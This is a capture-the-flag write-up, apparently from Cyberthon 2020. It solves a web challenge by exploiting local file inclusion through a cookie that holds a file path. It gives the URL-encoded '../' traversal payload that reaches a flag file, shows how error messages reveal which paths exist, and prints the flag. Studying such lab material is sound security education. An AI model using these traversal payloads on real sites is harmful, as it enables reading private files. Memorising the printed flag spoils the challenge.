# Search high and low, you should. Yeesssssss.

## Description

Bob rushed out the site for ShoppingBaba's big Star Wars merchandise  sale so that he could go home and watch The Mandalorian. While he was at home, the attackers found a bug that allowed them to move outside the webserver and find his hidden secrets. His greatest secret was found in  the flag file found on his Desktop folder named babyyoda.

## Solution

The description hints strongly at some kind of local file inclusion exploit (see CSCG LFI). Go look for somewhere with a file path:

![Filepath Cookie](https://raw.githubusercontent.com/willi123yao/Cyberthon2020_Writeups/master/web_services/yoda/cookie.txt)

Ah, this cookie has a file path: `%2Fbabyyoda_old_method.jpg`. `%2F` is `/` in URL encoding. However, it points at the wrong place. Let's try adding a `../` _(cookie is `%2F..%2Fbabyyoda_old_method.jpg`)_:

![**Warning**:  include(/var/www/html/picture/../babyyoda_old_method.jpg): failed to open stream: No such file or directory in **/var/www/html/index.php** on line **15**](https://raw.githubusercontent.com/willi123yao/Cyberthon2020_Writeups/master/web_services/yoda/error.png)

The file is in the Desktop folder, to we can try this cookie (normal Linux filesystem):

```
%2F..%2F..%2F..%2F..%2Fhome%2Fbob%2FDesktop%2Fbabyyoda%2Fflag
  /..  /..  /..  /..  /home  /bob  /Desktop  /babyyoda  /flag
 get back to root    |          get to the flag 
```

Point to note: when the file path leads to a folder, it returns

```
failed to open stream: Success
```

If the file path is invalid, it will return

```
failed to open stream: No such file or directory
```

This can be used to identify valid and invalid paths.

## Flag

```
Cyberthon{3nufm0v1ng4rd}
```
